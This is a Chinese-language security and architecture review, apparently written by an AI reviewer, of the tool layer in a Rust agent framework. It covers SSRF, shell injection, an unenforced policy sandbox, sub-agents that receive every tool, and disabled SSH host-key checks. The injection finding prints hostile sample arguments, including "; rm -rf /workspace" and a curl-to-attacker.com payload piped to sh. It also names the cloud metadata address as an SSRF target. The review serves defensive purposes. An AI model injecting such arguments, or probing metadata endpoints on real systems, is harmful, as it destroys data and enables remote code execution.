# Review: 工具系统 (tools/)

**Date**: 2026-06-06
**Reviewer**: Architecture Critic (AI)
**Scope**: src/tools/ 所有文件

---

## Executive Summary

工具系统整体设计清晰，`Tool` trait 接口合理，`resolve_within` 沙箱函数对所有 fs 工具一致执行，权限审计层（AuditMeta、PermissionHook）有价值且有测试覆盖。主要亮点是 `str_replace.rs` 的模糊匹配链、有意义的错误类型传播，以及子 Agent 的深度限制机制。

需要重点关注的安全问题有三个：(1) `WebFetch` 和 `a2a_call` 均无 SSRF 过滤；(2) `run_skill_script.rs` 的 `args` 参数直接拼接进 shell 命令；(3) `SshTransport::exec_shell` 的 env key 未经 shell 转义拼入命令字符串。此外，`policy_sandbox.rs` 的 `check_shell` 从未被任何 shell 工具实际调用，架构上是一个"不生效的安全层"。

---

## 严重问题 (Critical)

### C-1: SSRF — `web_fetch.rs` 和 `a2a.rs` 无内网地址过滤

**位置**: `src/tools/web_fetch.rs:36-44`, `src/tools/a2a.rs:229-248`

**问题**: `WebFetch::validate_url` 只检查 scheme 是 `http://` 或 `https://`，完全未过滤 `http://localhost/...`、`http://127.0.0.1/...`、`http://169.254.169.254/...`（AWS metadata）、`http://10.x.x.x/...` 等内网目标。`A2aCallTool` 的 URL 甚至没有任何格式校验，直接传给 `reqwest`。

Agent 运行于 CI/CD 或云环境时，攻击者（或被污染的 LLM 输出）可通过这两个工具访问 IMDS、内部 API 网关、数据库控制面板。

**建议**:

```rust
fn reject_private_url(url: &str) -> Result<()> {
    let parsed = url::Url::parse(url).map_err(|_| /* BadToolArgs */)?;
    let host = parsed.host_str().unwrap_or("");
    // 拒绝 localhost / loopback / link-local / RFC1918
    if is_private_host(host) {
        return Err(Error::BadToolArgs { ... });
    }
    Ok(())
}
```

至少加一个可以通过配置覆盖的默认拒绝列表；在测试中使用 `127.0.0.1` 作为 mock server 的测试需配合允许列表白名单。

---

### C-2: `run_skill_script.rs` — `args` 字段未转义直接拼接 shell 命令

**位置**: `src/tools/run_skill_script.rs:134-144`

```rust
let args_str = arguments["args"].as_str().unwrap_or("");
let shell_command = if args_str.is_empty() {
    script.path.to_string_lossy().to_string()
} else {
    format!("{} {}", script.path.display(), args_str)  // ← 注入点
};
let mut cmd = Command::new("/bin/sh");
cmd.arg("-c").arg(&shell_command);  // ← 执行
```

LLM 可以传入 `args: "; rm -rf /workspace"` 或 `args: "$(curl attacker.com/payload | sh)"` 来完全绕过脚本逻辑。与沙箱设计的其他部分（cwd resolve_within、policy deny_patterns）正好相反，这里是一个未把守的注入口。

**建议**: 将脚本路径和参数分别作为独立参数传给 `Command`，不拼接字符串：

```rust
let mut cmd = Command::new(&script.path);
if !args_str.is_empty() {
    // 以空格分割，或要求 args 为 array 类型
    cmd.args(args_str.split_whitespace());
}
cmd.current_dir(&self.workspace);
```

或者将 JSON schema 中 `args` 的类型改为 `array of string`，完全消除分割歧义。

---

### C-3: `SshTransport::exec_shell` — env key 未转义拼入远程命令

**位置**: `src/tools/transport.rs:334-344`

```rust
for (key, val) in env {
    env_prefix.push_str(&format!("{}={} ", key, shell_escape(val)));
    //                                ^^^^ key 未转义
}
let remote_cmd = format!("cd {} && {} {}", ..., env_prefix, command);
```

`val` 被 `shell_escape` 保护，但 `key` 直接拼入。如果 `key` 包含 `; malicious_command #`，远程执行的命令会被注入。在代理传入的 env map 不受信任时（例如从 LLM 的 `Bash` 工具 `env` 参数中路由过来），这是一个真实路径。

**建议**: 对 `key` 做严格校验（只允许 `[A-Za-z_][A-Za-z0-9_]*`），拒绝不合规 key：

```rust
if !key.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
    return Err(std::io::Error::new(
        std::io::ErrorKind::InvalidInput,
        format!("invalid env key: {key}"),
    ));
}
```

---

## 中等问题 (Major)

### M-1: `policy_sandbox.rs` 是空壳安全层 — 从未被 shell 工具调用

**位置**: `src/tools/shell.rs`, `src/tools/run_background.rs`, `src/tools/policy_sandbox.rs`

`PolicyConfig::check_shell` 和 `check_fs_path` 在测试 (`tool_set_provider.rs:174-176`) 之外，**没有任何 shell 工具在执行前调用它们**。`RunShell::execute` 接收命令字符串后直接 `spawn`，根本不检查 policy。`PolicyConfig::default_restrictive()` 里定义的 `rm -rf /` 等规则，只有在 entry-point 主动 `.with_policy()` 并且工具自己主动查询时才生效——但工具代码里没有这个逻辑。

这意味着 `PolicyConfig` 作为一个"安全层"完全依赖调用方主动集成，而不是在工具层自动执行。这与文档描述（"L1 policy-based sandbox wrapper for tools"）不符。

**建议**: 要么在 `RunShell::execute` 开头注入 policy 检查（但 Tool trait 目前无法访问 registry 或 policy），要么诚实地把 `PolicyConfig` 的 `check_shell` 改为在 `ToolRegistry::invoke_with_audit` 里对 `Bash` 工具统一调用，要么在文档里明确说明需要 entry-point 调用者负责执行。现状是文档承诺了但代码不兑现。

---

### M-2: `transport.rs` 的 `expect()` 违反 Invariant #5

**位置**: `src/tools/transport.rs:188-189, 349-350, 436-437`

```rust
let mut stdout = child.stdout.take().expect("stdout piped");
let mut stderr = child.stderr.take().expect("stderr piped");
```

这三处 `expect` 出现在 production code 路径（`ssh_exec`、`SshTransport::exec_shell`、`LocalTransport::exec_shell`），违反了项目 Invariant #5（不得在非测试代码中使用 `unwrap()`/`expect()`）。

虽然"stdout 必然存在"在语义上是对的（因为设置了 `Stdio::piped()`），但这是一个 panic 点——如果操作系统资源耗尽导致 pipe 创建失败，进程会崩溃而非优雅报错。

**建议**: 改为 `.ok_or_else(|| std::io::Error::new(std::io::ErrorKind::BrokenPipe, "stdout not piped"))?`。

---

### M-3: `web_fetch.rs:31` — 构造器中的 `expect`

**位置**: `src/tools/web_fetch.rs:31`

```rust
.build()
.expect("reqwest client build");
```

`WebFetch::new()` 在初始化时 panic，而不是返回 `Result`。`reqwest::Client::builder()` 在正常环境下不会失败，但这仍是一个文档化的违规（Invariant #5）。若将来添加 TLS 证书配置等可能失败的选项，这个 panic 会留下隐患。

**建议**: 将 `WebFetch::new()` 改为返回 `Result<Self, Error>`，或使用 `OnceLock` / 懒初始化方式。

---

### M-4: `sub_agent.rs` 的 `build_sub_registry` 存在双重注册问题

**位置**: `src/tools/sub_agent.rs:133-141`

```rust
fn build_sub_registry(&self, tool_names: &[String]) -> ToolRegistry {
    let mut reg = self.all_tools.fork();  // fork = clone，包含所有工具
    for name in tool_names {
        if let Some(tool) = self.all_tools.get(name) {
            reg = reg.register(tool);      // 重复注册（覆盖自身）
        }
    }
    reg
}
```

`fork()` 的实现是 `self.clone()`（见 `mod.rs:435`），会复制全部工具。之后循环再次注册指定工具只是 BTreeMap 的覆盖操作，没有"过滤"效果。**调用者期望子 registry 只包含 `tool_names` 指定的工具，但实际得到的是全量工具集。**

`spawn_worker.rs:170-178` 有同样的 bug。

**建议**: 将 `fork()` 改为从空 registry 开始：

```rust
fn build_sub_registry(&self, tool_names: &[String]) -> ToolRegistry {
    let mut reg = self.all_tools.with_same_transport();  // 空 registry，共享 transport
    for name in tool_names {
        if let Some(tool) = self.all_tools.get(name) {
            reg = reg.register(tool);
        }
    }
    reg
}
```

---

### M-5: `send_message` 的 `ToolSideEffect` 分类错误

**位置**: `src/tools/send_message.rs:168-170`

```rust
fn side_effect_class(&self) -> ToolSideEffect {
    ToolSideEffect::ReadOnly  // ← 错误
}
```

`SendMessageTool::execute` 会向 `WorkerMailbox` 写入消息（`push_back`），这是一个可观测的状态变更，不是只读操作。错误分类导致并发调度器可能将多个 `send_message` 调用并行执行，而正确行为应当是顺序的（以保证消息顺序）。

**建议**: 改为 `ToolSideEffect::Mutating`。

---

### M-6: `a2a_call` async_mode 返回的 shell 脚本含硬编码 `python3`

**位置**: `src/tools/a2a.rs:322-330`

```rust
let poll_cmd = format!(
    "... r=$(curl -sf ...); \
     s=$(echo \"$r\" | python3 -c \"...\"); ...",
    ...
);
```

生成的 shell 脚本依赖 `curl` 和 `python3` 均在 PATH 中。在最小化容器（alpine、distroless）里，这两个工具通常不存在。同时，这段 shell 脚本内嵌在 Rust 字符串里，维护性极差，也无法被测试覆盖。

**建议**: 将异步轮询逻辑移入 `a2a_task_check` 工具的 Rust 实现，或者至少用 `jq` 替换 `python3`（更常见于 CI 环境），并在文档中明确列出依赖。

---

## 轻微问题 (Minor)

### N-1: `sub_agent.rs` / `spawn_worker.rs` / `spawn_workers_parallel.rs` 三者重叠

这三个工具都是"派生子 Agent 运行任务"的变体，共享大量代码：
- 相同的 `build_sub_registry` 函数（各自独立复制）
- 相同的 depth-limit 检查
- 相同的 `TurnContext` 构建模式
- 相同的 `FinishReason` 格式化逻辑

从产品角度看，`sub_agent.rs`（`Agent` 工具）和 `spawn_worker.rs`（`spawn_worker` 工具）几乎是同一个工具的两个版本，区别仅是 worker type 枚举更丰富。建议将核心的"spawn a kernel with limited tools"逻辑抽取为一个内部辅助函数，三个工具都调用它。

### N-2: `a2a.rs` 和 `web_fetch.rs` 各自独立创建 `reqwest::Client`

`A2aCallTool::build_client()` 每次调用都新建一个 client（连接池不共享）。`WebFetch` 在 `new()` 时构建一个共享 client。`a2a_card`、`a2a_task_check` 也调用 `A2aCallTool::build_client()`。建议将 client 作为字段存储并在 `new()` 时初始化一次。

### N-3: `transport.rs` 的 `ToolTransport` trait 与实际工具使用脱节

`ReadFile`、`WriteFile`、`StrReplaceTool`、`SearchFiles` 等工具全部直接调用 `tokio::fs`，而不走 `ToolTransport::read_file/write_file` 接口。`ToolTransport` 目前只被 `LocalTransport::exec_shell` 和 `SshTransport` 使用，其声明的抽象（让工具可测试且可远程化）在大多数工具上根本没有落实。这让 `ToolTransport` 的接口成为一个"抽象泡沫"——只有两个实现，其中 `SshTransport` 也没有工具实际用它。

### N-4: `docker_sandbox.rs` 无 exec 退出码追踪

**位置**: `src/tools/docker_sandbox.rs:86-135`

`DockerShellTool::exec_command` 只返回 stdout+stderr 的合并文本，丢弃了 exec 的退出码。与 `RunShell` 的输出格式（`exit: N\n--- stdout ---\n...`）不一致，且调用方无法区分命令成功和失败。

### N-5: `resolve_within` 的 `absolutise()` 含 `unwrap_or`

**位置**: `src/tools/mod.rs:1061`

```rust
std::env::current_dir()
    .unwrap_or_else(|_| std::path::PathBuf::from("."))
    .join(p)
```

如果 `current_dir()` 失败（进程 cwd 被删除，这在 CI 中并不罕见），会静默地回退到 `.`，之后的路径检查会在错误基础上进行，沙箱边界可能被破坏。建议改为向上传播错误。

### N-6: `build_sub_registry` 在 `spawn_worker.rs` 处理"全量工具"路径时注册了子 `spawn_worker`，但未检查 depth

**位置**: `src/tools/spawn_worker.rs:351-368`

当 `worker_type` 是 `general` 或 `coder`（不限制工具集）时，子 worker 会获得一个新的 `SpawnWorkerTool`（depth+1）。但这个 child 工具只在"全量工具"路径下注册，"受限工具"路径下的 worker 无法递归——导致 general worker 可以嵌套但 reviewer/explore 不能，行为不对称且未在文档中说明。

### N-7: `SshTransport` 禁用了 `StrictHostKeyChecking`，且丢弃 known_hosts

**位置**: `src/tools/transport.rs:158-160`

```rust
cmd.arg("-o").arg("StrictHostKeyChecking=no");
cmd.arg("-o").arg("UserKnownHostsFile=/dev/null");
```

这使得所有 SSH 连接都容易受到中间人攻击。可以理解这是为了简化 CI 自动化，但应在文档中明确标注，并提供配置选项让生产部署可以启用主机验证。

---

## 正面评价

1. **`resolve_within` 设计严谨**: 同时做了词法 `starts_with` 检查和 `canonicalize` 符号链接检查，两层防护。所有 fs 工具（`ReadFile`, `WriteFile`, `StrReplaceTool`, `SearchFiles`, `GlobTool`, `RunBackground`, `RunShell` cwd 等）都一致调用了它。

2. **错误处理整体符合规范**: 没有在 production path 中滥用 `unwrap()`（transport.rs 的三处 `expect` 是已知例外）；错误都通过 `Error::Tool` / `Error::BadToolArgs` 上报，有利于 LLM 理解错误语义。

3. **AuditMeta 设计有价值**: BLAKE3 args hash + 步骤 ID + 时间戳，为 resume/replay 检测提供了扎实基础。`ToolSideEffect` 分类让并行调度有据可依。

4. **`StrReplaceTool` 的模糊匹配链**: 五级渐进匹配（exact → 引号标准化 → trailing whitespace → 组合 → desanitize）是对 LLM 输出特性的精准适配，且有充分的单元测试覆盖。

5. **`SubAgent` 深度限制**: 通过 `RECURSIVE_SUBAGENT_MAX_DEPTH` env 配置深度上限，防止无界递归；测试用例覆盖了边界行为。

6. **测试覆盖率可观**: 每个主要工具都有 `#[cfg(test)]` 模块，涵盖了 happy path 和重要的错误 path（逃逸路径、超时、缺失参数）。`A2aCallTool` 的 mock server 测试特别扎实。

---

## 建议优先级

| 优先级 | 问题 | 预计工时 |
|--------|------|---------|
| P0 | C-2: run_skill_script args 注入 | 0.5h |
| P0 | C-3: SshTransport env key 注入 | 0.5h |
| P0 | C-1: WebFetch/a2a SSRF | 2h |
| P1 | M-1: PolicyConfig 从未被 shell 调用 | 2h |
| P1 | M-4: build_sub_registry 双重注册逻辑错误 | 1h |
| P1 | M-2/M-3: production expect/panic | 1h |
| P2 | M-5: send_message 分类错误 | 0.25h |
| P3 | N-* 其余 Nit | 按需 |

---

## 最终结论

**如果只能改一件事，应该是 M-4（`build_sub_registry` 双重注册逻辑）。** 这是一个静默的安全隐患：调用者相信 explore/reviewer worker 只有只读工具，但实际上它们拥有全量工具集（包括 `Write`、`Bash`）。这直接破坏了子 Agent 类型系统的语义承诺——explore agent 并不 explore-only，reviewer agent 并不 read-only——而系统其他部分（并行调度的 `is_readonly_for_args`、权限检查）都依赖这个承诺成立。修复只需把 `fork()` 替换为 `with_same_transport()`，影响范围可控，收益最大。
